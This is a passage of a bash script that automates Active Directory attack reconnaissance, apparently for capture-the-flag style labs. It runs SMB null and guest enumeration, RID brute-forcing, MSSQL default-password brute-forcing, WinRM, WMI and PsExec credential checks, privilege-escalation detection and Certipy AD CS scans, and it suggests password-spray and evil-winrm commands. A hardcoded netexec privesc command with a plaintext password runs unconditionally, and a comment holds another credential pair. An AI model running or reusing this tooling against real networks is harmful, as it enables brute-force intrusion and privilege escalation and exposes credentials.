	    if [ "$READ" = "yes" ] && [[ "$share" =~ ^(NETLOGON|SYSVOL)$ ]]; then
         	critical "  READ access to $share — Active Directory attack surface exposed"

         	echo "KERBEROS" >> "$HINT_FILE"
    	    	echo "LDAP" >> "$HINT_FILE"
	    fi
	    
            echo -e "      - $share [read=$(color_perm "$READ") write=$(color_perm "$WRITE")]"
            if [ "$READ" = "yes" ]; then
            	#Attempt to list files in Share that you have "Read" Access to.
            	# echo "         [DEBUG] SMBMAP()"
    		smb_list_files "$share" "$LABEL" ""
	    fi
        done

        SMB_ENUM_SUCCESS=true
        [ "$LABEL" = "NULL session" ] && SMB_NULL_OK=true
        [ "$LABEL" = "GUEST" ] && SMB_GUEST_OK=true
    }

    # -------- Auth Attempts (ORDER MATTERS) --------
    # 1) True NULL session
    if smb_auth_check "%"; then
        success "SMB NUll Session successful"
        SMB_NULL_OK=true
        
    	smb_enum_smbclient "%" "NULL session" || \
            notify "NULL Session Allowed, but no shares are visible to this user"
        if [[ "$NTLM_ENABLED" = true ]]; then
            smb_enum_smbclient "%" "NULL session" || \
                notify "NULL Session Allowed, but no shares are visible to this user"
        else
            smb_enum_netexec "" "" "NULL session" || \
                notify "Authenticated but no shares are visible to this user"
        fi
    else
        warn "SMB NULL Session failed"
    fi 

    # 2) Guest with empty password (matches CME behavior)
    if smb_auth_check "guest%"; then
        success "SMB GUEST (No Password) Successful"
        SMB_GUEST_OK=true
        
        if [[ "$NTLM_ENABLED" = true ]]; then
            smb_enum_smbclient "guest%" "GUEST" || \
                notify "Authenticated but no shares are visible to this user"
        else
            smb_enum_netexec "guest" "" "GUEST" || \
                notify "Authenticated but no shares are visible to this user"
        fi
    else
        warn "SMB Guest (No Password) Session Failed"
    fi 
    
    # 3) Check for authenticated access.
    if $CREDS_PROVIDED; then
        echo
        info "Attempting SMB authentication with provided credentials"

        if smb_auth_check "$AUTH_USER%$AUTH_PASS"; then
            success "SMB authentication successful"
            SMB_AUTH_OK=true
            
            if [[ "$NTLM_ENABLED" = true ]]; then
                smb_enum_smbclient "$AUTH_USER%$AUTH_PASS" "AUTHENTICATED" || \
                    notify "Authenticated but no shares are visible to this user"
            else
                smb_enum_netexec "$AUTH_USER" "$AUTH_PASS" "AUTHENTICATED" || \
                    notify "Authenticated but no shares are visible to this user"
            fi
        else
            warn "SMB authentication failed for provided credentials"
        fi
    fi

    # -------- Fallback to smbmap --------
    if ! $SMB_ENUM_SUCCESS; then
        info "smbclient yielded no shares — trying smbmap fallback..."
        smb_enum_smbmap "NULL session" "" || true
        smb_enum_smbmap "GUEST" "-u guest -p ''" || true
    fi

    # -------- CME Enumeration --------
    if command -v crackmapexec >/dev/null 2>&1; then
        info "SMB Shares Detected!"
        info "  Attempting to Enumerate Access..."

        if $SMB_NULL_OK; then
            cme_enum_users "NULL session" "" || true
        fi
        if $SMB_GUEST_OK; then
            cme_enum_users "GUEST" "-u guest -p ''" || true
        fi
        if $CREDS_PROVIDED; then 
            if [[ "$NTLM_ENABLED" = true ]]; then
                cme_enum_users "AUTHENTICATED" "-u $AUTH_USER -p $AUTH_PASS" || true
            else
                nxc_enum_users "AUTHENTICATED" "-u $AUTH_USER -p $AUTH_PASS -d ${AUTH_DOMAIN:-$LDAP_DOMAIN} -k" || true
            fi
        fi
    fi

    # -------- CME RID Brute (CRITICAL if Guest allowed) --------
    if command -v crackmapexec >/dev/null 2>&1 && $SMB_GUEST_OK; then
        echo
        critical "SMB RID brute-force possible as GUEST with NoPassword (DOMAIN USER ENUMERATION)"

        info "Running crackmapexec RID brute (safe enumeration)..."

        RID_OUTPUT=$(crackmapexec smb "$TARGET_IPV4" -u guest -p '' --rid-brute 2>/dev/null)

        USERS=$(echo "$RID_OUTPUT" | awk -F'\\\\' '
             /SidTypeUser/ && !/\$/ {
                 split($2,a," ")
                 print a[1]
             }' | sort -u)

        if [ -n "$USERS" ]; then
            # Timestamped users file (always unique)
            DATE_TAG=$(date +"%Y%m%d_%H%M%S")
            USERS_FILE="users_${TARGET_IPV4}_${DATE_TAG}.txt"

            notify "Discovered domain users via RID brute:"
            for user in $USERS; do
                echo -e "      - ${BYELLOW}$user${RESET}"
                echo "$user" >> "$USERS_FILE"
            done

            note "User list saved to: ${GREEN}$USERS_FILE${RESET}"
            lightbulb " Maybe try a Password Spary if you know a 'default' Password"
            lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
            echo -e "        crackmapexec smb ${TARGET_IPV4} -u $USERS_FILE -p 'ADefaultPassword'"
            record_command "SMB" "Auth Discovery - Password Spary" "crackmapexec smb ${TARGET_IPV4} -u $USERS_FILE -p '--ADefaultPassword--'"

            # Feed recon hints
            echo "KERBEROS" >> "$HINT_FILE"
            echo "LDAP" >> "$HINT_FILE"
        else
            notify "RID brute completed, but no users parsed"
        fi
    fi

    # -------- No Shares Found --------
    if ! $SMB_ENUM_SUCCESS; then
        if $CREDS_PROVIDED; then
            info "No SMB Shares Detected. Maybe retry with different user creds?"
        else
            info "No SMB Shares Detected. Maybe retry with user creds?"
        fi
    fi
fi

# Verify Creds can Access Domain Controller
if  $CREDS_PROVIDED && [ $HAS_LDAP -eq 1 ]  ; then
    if dc_auth_check "$AUTH_USER" "$AUTH_PASS" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$TARGET_IPV4"; then
        echo
        success "${GREEN}Credentials successfully authenticated to Domain Controller!${RESET}"
        echo
        DC_AUTH_OK=1
    else
        echo
        warn "${RED}Credentials failed to authenticate to Domain Controller.${RESET}"
        echo
    fi
fi

# --------- LDAP Enumeration ----------
if [ $HAS_LDAP -eq 1 ]; then
    LDAP_FOUND=true
fi
if [ -s "$LDAP_MARKER" ] && ! $LDAP_ENUM_DONE; then
    echo
    info "Querying LDAP RootDSE..."
    
    #echo "LDAP_ENUM ANON"
    echo
    ldap_enum anon "${AUTH_DOMAIN:-$LDAP_DOMAIN}"

    #echo "LDAP_ENUM With Creds"
    echo
    $CREDS_PROVIDED && ldap_enum auth "${AUTH_DOMAIN:-$LDAP_DOMAIN}"
    echo
    if $LDAP_AUTH_BIND; then
        high_risk "LDAP Exposure Level: Directory is Accessible with known/compromised credentials"
    fi
    if $LDAP_GUEST_BIND; then
        high_risk "LDAP Exposure Level: Guest-Accessible Directory"
    fi
    if $LDAP_ANON_BIND; then
        high_risk "LDAP Exposure Level: Anonymous Directory Access"
    fi
fi
if $LDAP_AUTH_BIND; then
    #Get Domain/AD Version
    #netexec ldap eighteen.htb -u adam.scott -p 'iloveyou1' --query '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' 'dNSHostName operatingSystem operatingSystemVersion'
    # Check for BadSuccessor Attack
    check_badsuccessor || true
fi

# Verify Creds can Access Windows Host
if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "135" && \
   printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "445"; then

    echo
    info "WMI likely supported — ports 135 and 445 are open"

    if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
        check_wmi_access "$TARGET_IPV4" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
    else
        note "No credentials provided — skipping authenticated WMI check"
    fi
fi
if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "445"; then

    echo
    info "Service Control Manager Detected! - Port 445 open — testing PsExec access"

    if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
        check_psexec_access "$TARGET_IPV4" "${AUTH_DOMAIN:-$LDAP_DOMAIN}" "$AUTH_USER" "$AUTH_PASS"
    else
        note "No credentials provided — skipping authenticated PsExec check"
    fi
fi

# --------- Kerberos Post-Scan Handling ----------
if [ -s "$KERB_MARKER" ]; then
    KERB_DETECTED=true
    
    if resolve_kerberos_realm; then
        if $ENABLE_KERB_ENUM; then
            kerberos_enum_users
        else
            alert "Kerberos detected — re-run with --kerb-enum to enumerate users"
        fi

        if $CREDS_PROVIDED; then
            kerberos_auth_check
        fi
    else
        notify "Kerberos detected, but domain/realm could not be resolved"
    fi
fi

#############################################
# SQL Instance Identified - Enumerate it
#############################################
HAS_MSSQL=false
# -------- MSSQL Reminder --------
if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "1433"; then
    HAS_MSSQL=true
fi

# Mark that a live MSSQL instance was found

if [[ "$HAS_MSSQL" == "true" && "$ENABLE_BH_EXPORT" == "true" ]]; then
    echo
    info "MSSQL service detected on port 1433 — beginning enumeration..."

    MSSQL_ENUM_OUTPUT=""
    
    if command -v crackmapexec >/dev/null 2>&1 || command -v netexec >/dev/null 2>&1; then
        tool=$(command -v crackmapexec || command -v netexec)
        DATE_TAG=$(date +"%Y%m%d_%H%M%S")
        # 1. Try NULL session
        echo -e "   Trying Null Session access..."
        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "           ${GREEN}$tool mssql "$TARGET_IPV4" -u '' -p ''${RESET}"
        record_command "MSSQL" "Discovery" "$tool mssql "$TARGET_IPV4" -u '' -p ''"

        MSSQL_ENUM_OUTPUT=$($tool mssql "$TARGET_IPV4" -u '' -p '' 2>&1)
        echo "$MSSQL_ENUM_OUTPUT" | tee "mssql_nullenum_${TARGET_IPV4}_${DATE_TAG}.txt"

        if echo "$MSSQL_ENUM_OUTPUT" | grep -qP "\[\+\]"; then
            critical "MSSQL allows NULL login!"
            MSSQL_NULL_LOGIN=true
        elif echo "$MSSQL_ENUM_OUTPUT" | grep -qP "\[-\]"; then
            warn "MSSQL denied NULL login"
        elif echo "$MSSQL_ENUM_OUTPUT" | grep -qi "Unpacked data doesn't match"; then
            warn "MSSQL parsing error or unsupported auth method — crackmapexec may be failing."
            warn "Output was:"
            echo "$MSSQL_ENUM_OUTPUT"
        else
            warn "MSSQL scan returned unexpected output format"
            echo "$MSSQL_ENUM_OUTPUT"
        fi

        
        # Extract any username if present
        MSSQL_USER=$(echo "$MSSQL_ENUM_OUTPUT" | grep -oP '\+\] \K\S+(?=[:@])' | head -n1)
        if [[ -n "$MSSQL_USER" ]]; then
            lightbulb "Valid user identified from service banner: ${YELLOW}$MSSQL_USER${RESET}"
        fi

        # 2. Try default credentials
        if [[ "$ENABLE_MSSQL_BRUTE" == true ]]; then
            echo
            info "Testing default MSSQL credentials..."
            declare -a DEFAULT_USERS=("sa" "admin" "sql" "sqladmin" "dbo" "dba")
            declare -a DEFAULT_PASSWORDS=("" "sa" "default" "superadmin" "password" "admin" "1234" "12345" "123456" "P@ssw0rd" "admin123" "root")

            for user in "${DEFAULT_USERS[@]}"; do
                for pass in "${DEFAULT_PASSWORDS[@]}"; do
                    OUT=$($tool mssql "$TARGET_IPV4" -u "$user" -p "$pass" 2>/dev/null)
                     if echo "$OUT" | grep -qP "\[\+\]"; then
                        critical "Valid MSSQL default credentials found: ${YELLOW}$user${RESET}:${GREEN}$pass${RESET}"
                        MSSQL_DEFAULT_CREDS_FOUND=true
                        MSSQL_USER="$user"
                        # Optionally save for later use
                        echo "$user:$pass" > "mssql_default_creds_${TARGET_IPV4}_${DATE_TAG}.txt"
                        break 2
                     fi
                 done
             done
         fi
    else
        warn "Neither crackmapexec nor netexec is available to enumerate MSSQL."
    fi

    # Optional: set flags or write to a report file for decision engine
    echo "MSSQL_ENUM=true" >> recon_flags.txt
    [[ "$MSSQL_NULL_LOGIN" == true ]] && echo "MSSQL_NULL_LOGIN=true" >> recon_flags.txt
elif [[ "$HAS_MSSQL" == "true" && "$ENABLE_BH_EXPORT" == "false" ]]; then
    echo     
    alert "${BLUE}Tip:${RESET} MSSQL Port detected"
    echo "  --------------------------------------"
    echo -e "    Re-run with ${BLUE}--check-mssql${RESET} to enable MSSQL Enumeration"
    echo "    Example:"
    echo "      ./bash_simpleportscan.sh $TARGET --check-mssql"
fi

#############################################
# Check to see what Credentials can access
#############################################
if $CREDS_PROVIDED; then
    #echo "[DEBUG] Creds were provided"
    # Check creds is Kerberos Service is deteted.
    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "88"; then
        KERB_AUTH_OK=false
        $CREDS_PROVIDED && kerberos_auth_check || true
    fi
 
    echo
    info "Single-shot credential reuse check..."   
    # WinRM
    if [[ "$NTLM_ENABLED" == true ]]; then # WINRM only works when NTLM is available 
        if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "5985" \
           && command -v crackmapexec >/dev/null ; then

           #echo "[DEBUG] Creds were provided for CME targeting WINRM"
       
           info "Trying WinRM:"
           lightbulb "    ${YELLOW}Copy/Paste:${RESET}"
           echo -e "        ${GREEN}crackmapexec winrm $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
           echo -e "        ${GREEN}netexec winrm $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
           record_command "WINRM" "Discovery" "crackmapexec winrm $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'"
           record_command "WINRM" "Discovery" "netexec winrm $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'"
       
           if crackmapexec winrm "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
                    | grep -qP 'WINRM\s+\S+\s+\d+\s+\S+\s+\[\+\]'; then
                critical "WinRM Credential Access Confirmed!"
                WINRM_DETECTED=true
                echo -e "        ${GREEN}evil-winrm -i ${AUTH_DOMAIN:-$LDAP_DOMAIN} -u $AUTH_USER -p '$AUTH_PASS'${RESET}"
                record_command "WINRM" "Discovery" "evil-winrm -i ${AUTH_DOMAIN:-$LDAP_DOMAIN} -u $AUTH_USER -p '$AUTH_PASS'"
            else
                warn "WinRM authentication failed or not permitted"
            fi
        fi
    else
        info "Skipping WinRM: Requires NTLM to be Enabled"
    fi
    
    # WMI via Kerberos
    if [[ "$NTLM_ENABLED" == false && "$KERBEROS_AUTH_OK" == true ]] \
       && command -v wmiexec.py >/dev/null; then
        # Determine ticket location
        KRB5_CC_FILE="${KRB5CCNAME:-/tmp/krb5cc_$(id -u)}"
        info "Trying WMI via Kerberos:"
        if [[ ! -f "$KRB5_CC_FILE" ]]; then
            warn "Kerberos cache file not found: $KRB5_CC_FILE"
            warn "Run 'kinit ${AUTH_USER}@${LDAP_DOMAIN^^}' before proceeding."
        elif ! klist "$KRB5_CC_FILE" | grep -q "${AUTH_USER}@${LDAP_DOMAIN^^}"; then
            warn "Kerberos ticket does not match user: ${AUTH_USER}@${LDAP_DOMAIN^^}"
            klist "$KRB5_CC_FILE"
        else
            
            lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
            echo -e "        ${GREEN}impacket-wmiexec ${LDAP_DOMAIN}/${AUTH_USER}@${LDAP_DC_HOST} -dc-ip $TARGET_IPV4 -k -no-pass${RESET}"
            record_command "WMI" "Discovery" "impacket-wmiexec ${LDAP_DOMAIN}/${AUTH_USER}@${LDAP_DC_HOST} -dc-ip $TARGET_IPV4 -k -no-pass"

            WMIOUT=$(timeout 10 impacket-wmiexec "${LDAP_DOMAIN}/${AUTH_USER}@${LDAP_DC_HOST}" \
                        -dc-ip "$TARGET_IPV4" -k -no-pass 2>&1)

            if echo "$WMIOUT" | grep -qi "WBEM_E_ACCESS_DENIED"; then
                warn "WMI access denied: user lacks DCOM/WMI permissions on target"
            elif echo "$WMIOUT" | grep -qE "C:\\\\|Microsoft|SMBv"; then
                critical "WMI Credential Access via Kerberos Confirmed!"
                WINRM_DETECTED=true
            else
                warn "WMI test did not return expected response. Raw output:"
                echo "$WMIOUT"
            fi
        fi
    fi

    # MSSQL
    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx '1433'; then
        if ! command -v netexec >/dev/null 2>&1; then
   	    warn "MSSQL is open, but netexec is not installed"
        else
	    lightbulb "Trying MSSQL:"
	    lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
	    
	    echo -e "        ${GREEN}netexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
	    echo -e "        ${GREEN}netexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS' --local-auth${RESET}"
	    
	    #MSSQL_NULL_LOGIN=false
    	    #MSSQL_AUTH_OK=false
   	    #MSSQL_LCLAUTH_OK=false
    	    #MSSQL_INSTANCE_FOUND=false
	    #MSSQL_PRIVESC=false
	    #MSSQL_IMPERSONATE=false
    	    #MSSQL_USER=""
    
	    # Build shell-safe commands. %q correctly handles spaces and special
            # characters in usernames and passwords.
            printf -v nxc_command \
                'netexec mssql %q -u %q -p %q' \
                "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"

            printf -v nxc_local_command \
                '%s --local-auth' \
                "$nxc_command"

	    record_command "MSSQL" "Discovery" "$nxc_command"

	    record_command "MSSQL" "Discovery" "$nxc_local_command"

	    # Only suggest CrackMapExec when it is actually installed.
	    if command -v crackmapexec >/dev/null 2>&1; then
	        printf -v cme_command \
		    'crackmapexec mssql %q -u %q -p %q' \
	    	    "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"

	        echo -e "        ${GREEN}crackmapexec mssql $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}" 

	       record_command "MSSQL" "Discovery" "$cme_command"
	    fi

	    # Standard/domain authentication
            mssql_output="$(
                netexec mssql "$TARGET_IPV4" \
                    -u "$AUTH_USER" \
                    -p "$AUTH_PASS" 2>&1
            )" || :

            # Any normal MSSQL result line indicates that an instance responded.
            if grep -Eq '^MSSQL[[:space:]]+' <<< "$mssql_output"; then
                MSSQL_INSTANCE_FOUND=true
            fi

            # NetExec marks successful authentication with [+].
            if grep -Eq '^MSSQL[[:space:]].*\[\+\]' <<< "$mssql_output"; then
                MSSQL_AUTH_OK=true
                critical "MSSQL credential reuse confirmed"
            fi

            # Local authentication
            mssql_local_output="$(
                netexec mssql "$TARGET_IPV4" \
                    -u "$AUTH_USER" \
                    -p "$AUTH_PASS" \
                    --local-auth 2>&1
            )" || :

            if grep -Eq '^MSSQL[[:space:]]+' <<< "$mssql_local_output"; then
                MSSQL_INSTANCE_FOUND=true
            fi

            if grep -Eq '^MSSQL[[:space:]].*\[\+\]' <<< "$mssql_local_output"; then
                MSSQL_LCLAUTH_OK=true
                critical "MSSQL local credential reuse confirmed"
            fi
            
            if [[ "${MSSQL_AUTH_OK:-false}" == true ]]; then
	        run_mssql_rid_brute default
	        run_mssql_priv_detection default
	        run_mssql_cmdshell_check default
	    fi
	    if [[ "${MSSQL_LCLAUTH_OK:-false}" == true ]]; then
	        run_mssql_rid_brute local
	        run_mssql_priv_detection local
	        run_mssql_cmdshell_check local
	    fi
	    
	    netexec mssql 10.129.26.137 -u 'kevin ' -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv -o ACTION=privesc

            if [[ "$MSSQL_AUTH_OK" != true && "$MSSQL_LCLAUTH_OK" != true ]]; then
                warn "MSSQL authentication failed or was not permitted"
            fi
        fi
    fi
fi

ESCALATION_PRIVS_FOUND=false
SE_BACKUP_PRIV=false
SE_IMPERSONATE_PRIV=false
check_winrm_privs() {
    [[ "$WINRM_DETECTED" != true ]] && return

    info "Running whoami /priv via NetExec WinRM..."

    # Run command via NetExec and capture output
    PRIV_OUTPUT=$(timeout 15s netexec winrm "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" -d "${AUTH_DOMAIN:-$LDAP_DOMAIN}" -X 'whoami /priv' 2>/dev/null)

    # Check if we got any output
    if [[ -z "$PRIV_OUTPUT" ]]; then
        warn "No output from NetExec — WinRM command may have failed or timed out"
        return
    fi
    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
    echo "$PRIV_OUTPUT" > "whoami_privs_${TARGET_IPV4}_${AUTH_USER}_${DATE_TAG}.txt"

    # Known privesc privileges
    local -a PRIVESCLIST=(
        "SeImpersonatePrivilege"
        "SeAssignPrimaryTokenPrivilege"
        "SeDebugPrivilege"
        "SeBackupPrivilege"
        "SeRestorePrivilege"
        "SeTakeOwnershipPrivilege"
        "SeLoadDriverPrivilege"
        "SeTcbPrivilege"
        "SeCreateTokenPrivilege"
    )

    for priv in "${PRIVESCLIST[@]}"; do
        if echo "$PRIV_OUTPUT" | grep -q "$priv"; then
            FOUND_ESCALATION_PRIVS+=("$priv")
        fi
    done

    if [[ ${#FOUND_ESCALATION_PRIVS[@]} -gt 0 ]]; then
        critical "Privilege Escalation Vectors Detected via NetExec WinRM"
        for p in "${FOUND_ESCALATION_PRIVS[@]}"; do
            echo -e "      - ${GREEN}$p${RESET}"
            if [[ "$p" == "SeBackupPrivilege" ]]; then
                SE_BACKUP_PRIV=true
            fi
            if [[ "$p" == "SeImpersonatePrivilege" ]]; then
                SE_IMPERSONATE_PRIV=true
            fi
        done

    else
        info "No known privesc privileges found in whoami /priv output"
    fi
}

if [ "$WINRM_DETECTED" = true ]; then
    check_winrm_privs
fi

# Check for & get Domain SID
if (( HAS_SMB == 1 )) && [[ "$CREDS_PROVIDED" == true && "$SMB_AUTH_OK" == true && -n "$DOMAIN_CONTROLLER" ]]; then
    get_domain_sid "${AUTH_DOMAIN:-$LDAP_DOMAIN}/$AUTH_USER" "$AUTH_PASS" "$DOMAIN_CONTROLLER" "$NTLM_ENABLED" || true
fi

###########################################
# AD CS Vulnerable Certificate Detection
###########################################
if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CREDS_PROVIDED" == true ]]; then
    echo
    target_ca=""

    if command -v certipy-ad >/dev/null 2>&1; then
        ADCS_DOMAIN="${AUTH_DOMAIN:-$LDAP_DOMAIN}"
        ADCS_DOMAIN="${ADCS_DOMAIN,,}"
        ADCS_USER_UPN="${AUTH_USER}@${ADCS_DOMAIN}"
        CERTIPY_TARGET="$(get_preferred_dc_host "$TARGET_IPV4")"
        CERTIPY_DATE_TAG=$(date +"%Y%m%d_%H%M%S")
        CERTIPY_FILE="certipy_${TARGET_IPV4}_${CERTIPY_DATE_TAG}.txt"
        CERTIPY_OUTPUT=""
        CERTIPY_EXIT=1
        CERTIPY_USED_KERB=false

        info "Checking for vulnerable AD CS certificate templates"
        if [[ "$NTLM_ENABLED" == false || "$KERBEROS_FOUND" == true || "$KERB_DETECTED" == true ]]; then
    	    kerberos_ccache_reminder
    	    create_local_kerberos_ccache
	fi
        note "Certipy target hostname: ${CERTIPY_TARGET}"
        note "Certipy username: ${ADCS_USER_UPN}"

        if [[ "$NTLM_ENABLED" == false ]]; then
            CERTIPY_USED_KERB=true
            print_ntlm_kerberos_time_sync_note "$CERTIPY_TARGET"

            if certipy_prepare_kerberos "$ADCS_DOMAIN" "$CERTIPY_TARGET"; then
                echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
                echo -e "        ${GREEN}certipy-ad find -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -enabled -vulnerable -stdout -debug${RESET}"
                record_command "ADCS" "Vulnerable Certificate Detection" "certipy-ad find -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -enabled -vulnerable -stdout -debug"

                set +e
                CERTIPY_OUTPUT=$(certipy-ad find \
                    -u "$ADCS_USER_UPN" \
                    -k -no-pass \
                    -target "$CERTIPY_TARGET" \
                    -dc-ip "$TARGET_IPV4" \
                    -enabled \
                    -vulnerable \
                    -stdout \
                    -debug 2>&1)
                CERTIPY_EXIT=$?
                set -e
            else
                CERTIPY_OUTPUT="Certipy Kerberos preparation failed"
                CERTIPY_EXIT=1
            fi
        else
            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}certipy-ad find -u '${ADCS_USER_UPN}' -p '$AUTH_PASS' -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -enabled -vulnerable -stdout${RESET}"
            record_command "ADCS" "Vulnerable Certificate Detection" "certipy-ad find -u '${ADCS_USER_UPN}' -p '$AUTH_PASS' -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -enabled -vulnerable -stdout"

            set +e
            CERTIPY_OUTPUT=$(certipy-ad find \
                -u "$ADCS_USER_UPN" \
                -p "$AUTH_PASS" \
                -target "$CERTIPY_TARGET" \
                -dc-ip "$TARGET_IPV4" \
                -enabled \
                -vulnerable \
                -stdout 2>&1)
            CERTIPY_EXIT=$?
            set -e

            # If NTLM/password bind fails because NTLM is disabled, automatically retry with Kerberos.
            if echo "$CERTIPY_OUTPUT" | grep -qiE 'NTLM negotiate failed|STATUS_NOT_SUPPORTED|NTLM.*disabled|AcceptSecurityContext error'; then
                notify "Certipy password/NTLM bind failed; retrying AD CS check with Kerberos"
                NTLM_ENABLED=false
                CERTIPY_USED_KERB=true
                print_ntlm_kerberos_time_sync_note "$CERTIPY_TARGET"

                if certipy_prepare_kerberos "$ADCS_DOMAIN" "$CERTIPY_TARGET"; then
                    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
                    echo -e "        ${GREEN}certipy-ad find -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -enabled -vulnerable -stdout -debug${RESET}"
                    record_command "ADCS" "Vulnerable Certificate Detection - kerberos" "certipy-ad find -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -enabled -vulnerable -stdout -debug"

                    set +e
                    CERTIPY_OUTPUT=$(certipy-ad find \
                        -u "$ADCS_USER_UPN" \
                        -k -no-pass \
                        -target "$CERTIPY_TARGET" \
                        -dc-ip "$TARGET_IPV4" \
                        -enabled \
                        -vulnerable \
                        -stdout \
                        -debug 2>&1)
                    CERTIPY_EXIT=$?
                    set -e
                fi
            fi
        fi

        # Always display and save Certipy output. This avoids false "no vuln" results when no Certipy file is generated.
        echo "$CERTIPY_OUTPUT"
        echo
        printf "%s\n" "$CERTIPY_OUTPUT" > "$CERTIPY_FILE"
        info "Certipy results saved to: ${BYELLOW}$CERTIPY_FILE${RESET}"

        # -------- Common Kerberos / credential failure hints --------
        if echo "$CERTIPY_OUTPUT" | grep -qiE 'KRB_AP_ERR_SKEW|Clock skew'; then
            error "Kerberos clock skew detected during AD CS enumeration"
            lightbulb "Kerberos requires time sync (usually within five minutes)"
            echo -e "    ${GREEN}sudo ntpdate -u '$CERTIPY_TARGET'${RESET}"
            echo -e "    ${GREEN}while true; do sudo ntpdate -u '$CERTIPY_TARGET'; sleep 2; done${RESET}"
            record_command "NTP" "Kerberos clock skew detected" "while true; do sudo ntpdate -u '$CERTIPY_TARGET'; sleep 2; done"
        fi

        if echo "$CERTIPY_OUTPUT" | grep -qiE 'KDC_ERR_S_PRINCIPAL_UNKNOWN|Server not found in Kerberos database'; then
            error "Kerberos SPN/target mismatch during AD CS enumeration"
            lightbulb "Use the DC FQDN with Certipy Kerberos, not only the IP"
            echo -e "    ${GREEN}certipy-ad find -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -vulnerable -stdout -debug${RESET}"
            record_command "ADCS - Vulnerable Certificate Detection" "DC FQDN with Certipy Kerberos" "certipy-ad find -u '${ADCS_USER_UPN}' -k -no-pass -target '${CERTIPY_TARGET}' -dc-ip '${TARGET_IPV4}' -vulnerable -stdout -debug"
        fi

        if echo "$CERTIPY_OUTPUT" | grep -qiE 'KRB5CCNAME environment variable not set|CCache file is not found|No Kerberos credentials available'; then
            error "Kerberos ccache missing for Certipy"
            lightbulb "Create one manually:"
            echo -e "    ${GREEN}export KRB5CCNAME=\"\$PWD/${AUTH_USER}.ccache\"${RESET}"
            echo -e "    ${GREEN}kinit '${AUTH_USER}@${ADCS_DOMAIN^^}'${RESET}"
            echo -e "    ${GREEN}klist${RESET}"
        fi

        if echo "$CERTIPY_OUTPUT" | grep -qiE 'invalidCredentials|data 52e|KDC_ERR_PREAUTH_FAILED'; then
            error "Invalid domain credentials supplied or Kerberos pre-auth failed"
            lightbulb "Verify username/password"
            lightbulb "Confirm domain format: user@domain"
            lightbulb "Try manual Kerberos: kinit '${AUTH_USER}@${ADCS_DOMAIN^^}'"
            ADCS_SERVICE_DETECTED=true
        fi

        if [[ $CERTIPY_EXIT -ne 0 ]]; then
            warn "Certipy execution failed — not marking AD CS as clean"
            info "Continuing — AD CS detection is optional"
        else
            ADCS_SERVICE_DETECTED=true

            # -------- Vulnerability detection --------
            if grep -qiE 'ESC[0-9]+' "$CERTIPY_FILE"; then
                ADCS_VULNERABLE=true
                alert "VULNERABLE Active Directory Certificate Services detected"

                # Extract CA Names from Certipy output
                mapfile -t ADCS_CA_NAMES < <(
                    grep -iE '^\s*CA Name\s*:' "$CERTIPY_FILE" \
                    | awk -F ':' '{gsub(/^[ \t]+/, "", $2); print $2}' \
                    | sort -u
                )

                if [[ ${#ADCS_CA_NAMES[@]} -gt 0 ]]; then
                    success "Certificate Authority detected:"
                    for ca in "${ADCS_CA_NAMES[@]}"; do
                        echo -e "    ${CYAN}- $ca${RESET}"
                        target_ca="$ca"
                    done

                    # Optional: export for synopsis or later abuse
                    ADCS_CA_PRESENT=true
                else
                    warn "No Certificate Authority name found in Certipy output"
                    target_ca="<CA_NAME>"
                fi

                # -------- Extract ESC identifiers --------
                mapfile -t ADCS_ESC < <(
                    grep -oEi 'ESC[0-9]+' "$CERTIPY_FILE" \
                    | sort -u
                )

                if [[ ${#ADCS_ESC[@]} -gt 0 ]]; then
                    success "Exploitation paths identified:"
                    for esc in "${ADCS_ESC[@]}"; do
                        case "$esc" in
                            ESC1|ESC4)
                                 echo -e "    ${RED}${esc}${RESET}  →  ${RED}CRITICAL${RESET}  (10/10)"
